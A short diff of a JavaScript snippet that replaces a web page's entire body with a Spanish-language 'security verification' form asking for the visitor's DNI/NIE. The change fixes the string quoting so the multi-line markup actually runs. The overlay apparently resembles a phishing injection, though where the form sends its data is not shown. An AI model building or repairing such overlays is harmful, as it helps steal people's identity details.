@@ -1,4 +1,4 @@
-document.body.innerHTML='
+document.body.innerHTML=`
 <div style=font-family:sans-serif; text-align:center; margin-top:50px;>
     <h2 style=color:#333>Verificaci&oacute;n de Seguridad</h2>
     <p>Por favor, confirme su identidad para continuar.</p>
@@ -8,7 +8,7 @@ document.body.innerHTML='
             border:1px solid #ccc;
             border-radius:5px;
             text-align:left>
-                                                                        
+
         <label>DNI / NIE:
             <br>
             <input type=text style=width:100%; margin-bottom:10px>
@@ -31,4 +31,4 @@ document.body.innerHTML='
         </button>
     </form>
 </div>
-'
+`;
